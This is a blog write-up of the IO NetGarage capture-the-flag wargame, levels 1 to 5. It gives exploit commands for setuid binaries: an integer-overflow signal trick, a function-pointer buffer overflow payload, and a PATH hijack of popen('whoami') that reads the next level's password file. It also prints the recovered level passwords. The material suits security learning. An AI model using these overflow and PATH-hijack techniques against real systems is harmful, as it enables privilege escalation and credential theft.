<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="IO NetGarage 2 SSH Access:
ssh -p 2224 level1@io.netgarage.org level 1 ❮ ssh -p 2224 level1@io.netgarage.org
Just read the ~/README, challenges are in /levels
level1@io:/levels$ ls -ltra level01 -r-sr-x--- 1 level2 level1 1184 Jan 13 2014 level01 level1@io:/levels$ ./level01 Enter the 3 digit passcode to enter: 123 Checking the asm code:
level1@io:/levels$ objdump -d level01 level01: file format elf32-i386 Disassembly of section .text: 08048080 <_start>: 8048080: 68 28 91 04 08 push $0x8049128 8048085: e8 85 00 00 00 call 804810f <puts> 804808a: e8 10 00 00 00 call 804809f <fscanf> 804808f: 3d 0f 01 00 00 cmp $0x10f,%eax 8048094: 0f 84 42 00 00 00 je 80480dc <YouWin> 804809a: e8 64 00 00 00 call 8048103 <exit> Notice the cmp $0x10f,%eax, a comparision is being made there."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="IO NetGarage 2 SSH Access:
ssh -p 2224 level1@io.netgarage.org level 1 ❮ ssh -p 2224 level1@io.netgarage.org
Just read the ~/README, challenges are in /levels
level1@io:/levels$ ls -ltra level01 -r-sr-x--- 1 level2 level1 1184 Jan 13 2014 level01 level1@io:/levels$ ./level01 Enter the 3 digit passcode to enter: 123 Checking the asm code:
level1@io:/levels$ objdump -d level01 level01: file format elf32-i386 Disassembly of section .text: 08048080 <_start>: 8048080: 68 28 91 04 08 push $0x8049128 8048085: e8 85 00 00 00 call 804810f <puts> 804808a: e8 10 00 00 00 call 804809f <fscanf> 804808f: 3d 0f 01 00 00 cmp $0x10f,%eax 8048094: 0f 84 42 00 00 00 je 80480dc <YouWin> 804809a: e8 64 00 00 00 call 8048103 <exit> Notice the cmp $0x10f,%eax, a comparision is being made there."><meta property="og:title" content><meta property="og:description" content="IO NetGarage 2 SSH Access:
ssh -p 2224 level1@io.netgarage.org level 1 ❮ ssh -p 2224 level1@io.netgarage.org
Just read the ~/README, challenges are in /levels
level1@io:/levels$ ls -ltra level01 -r-sr-x--- 1 level2 level1 1184 Jan 13 2014 level01 level1@io:/levels$ ./level01 Enter the 3 digit passcode to enter: 123 Checking the asm code:
level1@io:/levels$ objdump -d level01 level01: file format elf32-i386 Disassembly of section .text: 08048080 <_start>: 8048080: 68 28 91 04 08 push $0x8049128 8048085: e8 85 00 00 00 call 804810f <puts> 804808a: e8 10 00 00 00 call 804809f <fscanf> 804808f: 3d 0f 01 00 00 cmp $0x10f,%eax 8048094: 0f 84 42 00 00 00 je 80480dc <YouWin> 804809a: e8 64 00 00 00 call 8048103 <exit> Notice the cmp $0x10f,%eax, a comparision is being made there."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/ctfs/io.netgarage.org/"><meta property="article:section" content="infosec"><title>IO NetGarage 2 </title><link rel=canonical href=https://www.darvein.net/infosec/ctfs/io.netgarage.org/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=io-netgarage-2>IO NetGarage 2
<a class=heading-link href=#io-netgarage-2><i class="fa fa-link" aria-hidden=true></i></a></h1><p>SSH Access:</p><p>ssh -p 2224
<a href=../mailto:level1@io.netgarage.org>level1@io.netgarage.org</a></p><h2 id=level-1>level 1
<a class=heading-link href=#level-1><i class="fa fa-link" aria-hidden=true></i></a></h2><p><code>❮ ssh -p 2224 level1@io.netgarage.org</code></p><p>Just read the ~/README, challenges are in <code>/levels</code></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-fallback data-lang=fallback><span style=display:flex><span>level1@io:/levels$ ls -ltra level01
</span></span><span style=display:flex><span>-r-sr-x--- 1 level2 level1 1184 Jan 13  2014 level01
</span></span><span style=display:flex><span>level1@io:/levels$ ./level01
</span></span><span style=display:flex><span>Enter the 3 digit passcode to enter: 123
</span></span></code></pre></div><p>Checking the asm code:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-fallback data-lang=fallback><span style=display:flex><span>level1@io:/levels$ objdump -d level01
</span></span><span style=display:flex><span>level01:     file format elf32-i386
</span></span><span style=display:flex><span>Disassembly of section .text:
</span></span><span style=display:flex><span>08048080 &lt;_start&gt;:
</span></span><span style=display:flex><span> 8048080:       68 28 91 04 08          push   $0x8049128
</span></span><span style=display:flex><span> 8048085:       e8 85 00 00 00          call   804810f &lt;puts&gt;
</span></span><span style=display:flex><span> 804808a:       e8 10 00 00 00          call   804809f &lt;fscanf&gt;
</span></span><span style=display:flex><span> 804808f:       3d 0f 01 00 00          cmp    $0x10f,%eax
</span></span><span style=display:flex><span> 8048094:       0f 84 42 00 00 00       je     80480dc &lt;YouWin&gt;
</span></span><span style=display:flex><span> 804809a:       e8 64 00 00 00          call   8048103 &lt;exit&gt;
</span></span></code></pre></div><p>Notice the <code>cmp $0x10f,%eax</code>, a comparision is being made there. <code>0x10f</code> is the response.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span>&gt;&gt;&gt; int(<span style=color:#0086d2>&#34;0x10f&#34;</span>, <span style=color:#0086f7;font-weight:700>16</span>)
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>271</span>
</span></span></code></pre></div><p>Finding the flag:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-fallback data-lang=fallback><span style=display:flex><span>level1@io:/levels$ ./level01
</span></span><span style=display:flex><span>Enter the 3 digit passcode to enter: 271
</span></span><span style=display:flex><span>Congrats you found it, now read the password for level2 from /home/level2/.pass
</span></span><span style=display:flex><span>sh-4.3$ cat .pass
</span></span><span style=display:flex><span>sh-4.3$ whoami
</span></span><span style=display:flex><span>level2
</span></span><span style=display:flex><span>sh-4.3$ cat /home/level2/.pass
</span></span><span style=display:flex><span>XNWFtWKWHhaaXoKI
</span></span></code></pre></div><h2 id=level-2>level 2
<a class=heading-link href=#level-2><i class="fa fa-link" aria-hidden=true></i></a></h2><p><code>ssh -p 2224 level2@io.netgarage.org</code></p><p>Checking files</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-fallback data-lang=fallback><span style=display:flex><span>level2@io:/levels$ find /levels -group level2
</span></span><span style=display:flex><span>/levels/level02_alt.c
</span></span><span style=display:flex><span>/levels/level02.c
</span></span><span style=display:flex><span>find: ‘/levels/beta’: Permission denied
</span></span><span style=display:flex><span>/levels/level02
</span></span><span style=display:flex><span>/levels/level02_alt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>level2@io:/levels$ /levels/level02
</span></span><span style=display:flex><span>source code is available in level02.c
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>level2@io:/levels$ cat level02.c
</span></span><span style=display:flex><span>//a little fun brought to you by bla
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#include &lt;stdio.h&gt;</span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#include &lt;stdlib.h&gt;</span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#include &lt;signal.h&gt;</span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#include &lt;unistd.h&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>void catcher(int a)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        setresuid(geteuid(),geteuid(),geteuid());
</span></span><span style=display:flex><span>        printf(<span style=color:#0086d2>&#34;WIN!\n&#34;</span>);
</span></span><span style=display:flex><span>        system(<span style=color:#0086d2>&#34;/bin/sh&#34;</span>);
</span></span><span style=display:flex><span>        exit(0);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>int main(int argc, char **argv)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        puts(<span style=color:#0086d2>&#34;source code is available in level02.c\n&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>if</span> (argc != <span style=color:#0086f7;font-weight:700>3</span> || !atoi(argv[2]))
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>return</span> 1;
</span></span><span style=display:flex><span>        signal(SIGFPE, catcher);
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>return</span> abs(atoi(argv[1])) / atoi(argv[2]);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>As the file <code>level02</code> also belgons the user <code>level03</code> it means if we can pop <code>/bin/sh</code> then we will become <code>level03</code> user.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>level2@io:/levels$ ls -ltra level02
</span></span><span style=display:flex><span>-r-sr-x--- <span style=color:#0086f7;font-weight:700>1</span> level3 level2 <span style=color:#0086f7;font-weight:700>5329</span> Oct  <span style=color:#0086f7;font-weight:700>4</span>  <span style=color:#0086f7;font-weight:700>2011</span> level02
</span></span></code></pre></div><p>From the C code we need to trigger a SIGFPE exception so it will call the <code>catcher()</code> function.</p><p>From wikipedia:</p><blockquote><p>SIGFPE. The SIGFPE signal is sent to a process when it executes an erroneous arithmetic operation, such as division by zero.</p></blockquote><p>The <code>abs()</code> function works only with intenger numbers, which means if we manage to make abs() fail overflowing its value the we will be executing the <code>catcher()</code> function.</p><p>Lowest intenger value:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-fallback data-lang=fallback><span style=display:flex><span>❯ echo &#34;-2^31&#34; | bc
</span></span><span style=display:flex><span>-2147483648
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>level2@io:/levels$ ./level02 <span style=color:#0086d2>&#34;-2147483648&#34;</span> <span style=color:#0086d2>&#34;-1&#34;</span>
</span></span><span style=display:flex><span>source code is available in level02.c
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>WIN!
</span></span><span style=display:flex><span>sh-4.3$
</span></span><span style=display:flex><span>sh-4.3$ whoami
</span></span><span style=display:flex><span>level3
</span></span><span style=display:flex><span>sh-4.3$ cat /home/level3/.pass
</span></span><span style=display:flex><span>OlhCmdZKbuzqngfz
</span></span></code></pre></div><h2 id=level-3>level 3
<a class=heading-link href=#level-3><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>level3@io:~$ /levels/level03
</span></span><span style=display:flex><span>level3@io:~$ cat /levels/level03.c
</span></span><span style=display:flex><span>//bla, based on work by beach
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#include &lt;stdio.h&gt;</span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#include &lt;string.h&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>void good()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        puts(<span style=color:#0086d2>&#34;Win.&#34;</span>);
</span></span><span style=display:flex><span>        execl(<span style=color:#0086d2>&#34;/bin/sh&#34;</span>, <span style=color:#0086d2>&#34;sh&#34;</span>, NULL);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>void bad()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        printf(<span style=color:#0086d2>&#34;I&#39;m so sorry, you&#39;re at %p and you want to be at %p\n&#34;</span>, bad, good);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>int main(int argc, char **argv, char **envp)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        void (*functionpointer)(void) = bad;
</span></span><span style=display:flex><span>        char buffer[50];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>if</span>(argc != <span style=color:#0086f7;font-weight:700>2</span> || strlen(argv[1]) &lt; 4)
</span></span><span style=display:flex><span>                <span style=color:#fb660a;font-weight:700>return</span> 0;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        memcpy(buffer, argv[1], strlen(argv[1]));
</span></span><span style=display:flex><span>        memset(buffer, 0, strlen(argv[1]) - 4);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        printf(<span style=color:#0086d2>&#34;This is exciting we&#39;re going to %p\n&#34;</span>, functionpointer);
</span></span><span style=display:flex><span>        functionpointer();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>return</span> 0;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Similar situation than previous one but different C challenge.</p><p>So we already know that we want to execute the <code>good()</code> function which is going to give us a <code>/bin/sh</code>.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>level3@io:~$ /levels/level03 <span style=color:#0086f7;font-weight:700>1234</span>
</span></span><span style=display:flex><span>This is exciting we<span style=color:#0086d2>&#39;re going to 0x80484a4
</span></span></span><span style=display:flex><span><span style=color:#0086d2>I&#39;</span>m so sorry, you&#39;re at 0x80484a4 and you want to be at 0x8048474
</span></span></code></pre></div><p>Ok, we have to buffer overflow this.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>❯ ./pattern_create.rb -l <span style=color:#0086f7;font-weight:700>80</span>
</span></span><span style=display:flex><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
</span></span></code></pre></div><p>From GDB:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>gdb$ run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
</span></span><span style=display:flex><span>Starting program: /levels/level03 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>Breakpoint 1, 0x080484c8 in main ()
</span></span><span style=display:flex><span>gdb$ c
</span></span><span style=display:flex><span>Continuing.
</span></span><span style=display:flex><span>This is exciting we<span style=color:#0086d2>&#39;re going to 0x80484a4
</span></span></span><span style=display:flex><span><span style=color:#0086d2>I&#39;</span>m so sorry, you<span style=color:#0086d2>&#39;re at 0x80484a4 and you want to be at 0x8048474
</span></span></span><span style=display:flex><span><span style=color:#0086d2>...
</span></span></span><span style=display:flex><span><span style=color:#0086d2>Breakpoint 1, 0x080484c8 in main ()
</span></span></span><span style=display:flex><span><span style=color:#0086d2>gdb$ c
</span></span></span><span style=display:flex><span><span style=color:#0086d2>Continuing.
</span></span></span><span style=display:flex><span><span style=color:#0086d2>This is exciting we&#39;</span>re going to 0x63413563
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Program received signal SIGSEGV, Segmentation fault.
</span></span><span style=display:flex><span>--------------------------------------------------------------------------[regs]
</span></span><span style=display:flex><span>  EAX: 0x63413563  EBX: 0x00000000  ECX: 0x7FFFFFD5  EDX: 0xB7FC3870  o d I t S z a P c
</span></span><span style=display:flex><span>  ESI: 0x00000002  EDI: 0xB7FC2000  EBP: 0xBFFFFC28  ESP: 0xBFFFFBAC  EIP: 0x63413563
</span></span><span style=display:flex><span>  CS: <span style=color:#0086f7;font-weight:700>0073</span>  DS: 007B  ES: 007B  FS: <span style=color:#0086f7;font-weight:700>0000</span>  GS: <span style=color:#0086f7;font-weight:700>0033</span>  SS: 007BError <span style=color:#fb660a;font-weight:700>while</span> running hook_stop:
</span></span><span style=display:flex><span>Cannot access memory at address 0x63413563
</span></span><span style=display:flex><span>0x63413563 in ?? ()
</span></span></code></pre></div><p>Calculating the exact offset:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>❯ ./pattern_offset.rb -l <span style=color:#0086f7;font-weight:700>80</span> -q 0x63413563
</span></span><span style=display:flex><span>[*] Exact match at offset <span style=color:#0086f7;font-weight:700>76</span>
</span></span></code></pre></div><p>And finally&mldr;</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>level3@io:~$ /levels/level03 <span style=color:#fb660a;font-weight:700>$(</span>python -c <span style=color:#0086d2>&#39;print &#34;A&#34;*76 + &#34;\x74\x84\x04\x08&#34;&#39;</span><span style=color:#fb660a;font-weight:700>)</span>
</span></span><span style=display:flex><span>This is exciting we&#39;re going to 0x8048474
</span></span><span style=display:flex><span>Win.
</span></span><span style=display:flex><span>sh-4.3$ whoami
</span></span><span style=display:flex><span>level4
</span></span><span style=display:flex><span>sh-4.3$ cat /home/level4/.pass
</span></span><span style=display:flex><span>7WhHa5HWMNRAYl9T
</span></span></code></pre></div><h2 id=level-4>level 4
<a class=heading-link href=#level-4><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c><span style=display:flex><span>level4@io:~$ /levels/level04
</span></span><span style=display:flex><span>Welcome level5
</span></span><span style=display:flex><span>level4@io:~$ cat /levels/level04.c
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>//writen by bla
</span></span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic></span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>#include</span> <span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>&lt;stdlib.h&gt;</span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>#include</span> <span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#cdcaa9;font-weight:700>int</span> <span style=color:#ff0086;font-weight:700>main</span>() {
</span></span><span style=display:flex><span>        <span style=color:#cdcaa9;font-weight:700>char</span> username[<span style=color:#0086f7;font-weight:700>1024</span>];
</span></span><span style=display:flex><span>        FILE* f = <span style=color:#ff0086;font-weight:700>popen</span>(<span style=color:#0086d2>&#34;whoami&#34;</span>,<span style=color:#0086d2>&#34;r&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#ff0086;font-weight:700>fgets</span>(username, <span style=color:#fb660a;font-weight:700>sizeof</span>(username), f);
</span></span><span style=display:flex><span>        <span style=color:#ff0086;font-weight:700>printf</span>(<span style=color:#0086d2>&#34;Welcome %s&#34;</span>, username);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>At the begining I tought I could overflow <code>username</code> on the <code>fgets()</code> function, but later I have realized that the <code>popen</code> is a Linux syscall which pipes a command line execution and by passing the argument <code>r</code> it is reading from the child process. Arg <code>w</code> does the opposite. All I have to do is to fake the <code>whoami</code> bin.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>level4@io:~$ mkdir /tmp/nohere &amp;&amp; cd /tmp/nohere
</span></span><span style=display:flex><span>level4@io:/tmp/nohere$ vim whoami
</span></span><span style=display:flex><span>level4@io:/tmp/nohere$ chmod +x whoami
</span></span><span style=display:flex><span>level4@io:/tmp/nohere$ cat whoami
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#!/bin/sh</span>
</span></span><span style=display:flex><span>cat /home/level5/.pass
</span></span><span style=display:flex><span>level4@io:/tmp/nohere$ whoami
</span></span><span style=display:flex><span>level4
</span></span><span style=display:flex><span>level4@io:/tmp/nohere$ echo <span style=color:#fb660a>$PATH</span>
</span></span><span style=display:flex><span>/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span></span><span style=display:flex><span>level4@io:/tmp/nohere$ export <span style=color:#fb660a>PATH</span>=/tmp/nohere:<span style=color:#fb660a>$PATH</span>
</span></span><span style=display:flex><span>level4@io:/tmp/nohere$ whoami
</span></span><span style=display:flex><span>cat: /home/level5/.pass: Permission denied
</span></span><span style=display:flex><span>level4@io:/tmp/nohere$ /levels/level04
</span></span><span style=display:flex><span>Welcome DNLM3Vu0mZfX0pDd
</span></span></code></pre></div><h2 id=level-5>level 5
<a class=heading-link href=#level-5><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c><span style=display:flex><span>level5@io:~$ cat /levels/level05.c
</span></span><span style=display:flex><span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>#include</span> <span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>&lt;stdio.h&gt;</span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>#include</span> <span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>&lt;string.h&gt;</span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>
</span></span></span><span style=display:flex><span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#cdcaa9;font-weight:700>int</span> <span style=color:#ff0086;font-weight:700>main</span>(<span style=color:#cdcaa9;font-weight:700>int</span> argc, <span style=color:#cdcaa9;font-weight:700>char</span> **argv) {
</span></span><span style=display:flex><span>        <span style=color:#cdcaa9;font-weight:700>char</span> buf[<span style=color:#0086f7;font-weight:700>128</span>];
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>if</span>(argc &lt; <span style=color:#0086f7;font-weight:700>2</span>) <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>1</span>;
</span></span><span style=display:flex><span>        <span style=color:#ff0086;font-weight:700>strcpy</span>(buf, argv[<span style=color:#0086f7;font-weight:700>1</span>]);
</span></span><span style=display:flex><span>        <span style=color:#ff0086;font-weight:700>printf</span>(<span style=color:#0086d2>&#34;%s</span><span style=color:#0086d2>\n</span><span style=color:#0086d2>&#34;</span>, buf);
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>return</span> <span style=color:#0086f7;font-weight:700>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>level5@io:~$ ls -ltra /levels/level05
</span></span><span style=display:flex><span>-r-sr-x--- <span style=color:#0086f7;font-weight:700>1</span> level6 level5 <span style=color:#0086f7;font-weight:700>7140</span> Nov <span style=color:#0086f7;font-weight:700>16</span>  <span style=color:#0086f7;font-weight:700>2007</span> /levels/level05
</span></span></code></pre></div><p>This one has to be overflowed and it seems that we will need a pop a shell which will belong to <code>level6</code> user.</p><p>Segmentation fault found:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-fallback data-lang=fallback><span style=display:flex><span>level5@io:~$ /levels/level05 $(python -c &#39;print &#34;A&#34;*141&#39;)
</span></span><span style=display:flex><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>Segmentation fault
</span></span></code></pre></div><h2 id=level-6>level 6
<a class=heading-link href=#level-6><i class="fa fa-link" aria-hidden=true></i></a></h2><h2 id=level-7>level 7
<a class=heading-link href=#level-7><i class="fa fa-link" aria-hidden=true></i></a></h2><h2 id=level-8>level 8
<a class=heading-link href=#level-8><i class="fa fa-link" aria-hidden=true></i></a></h2></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>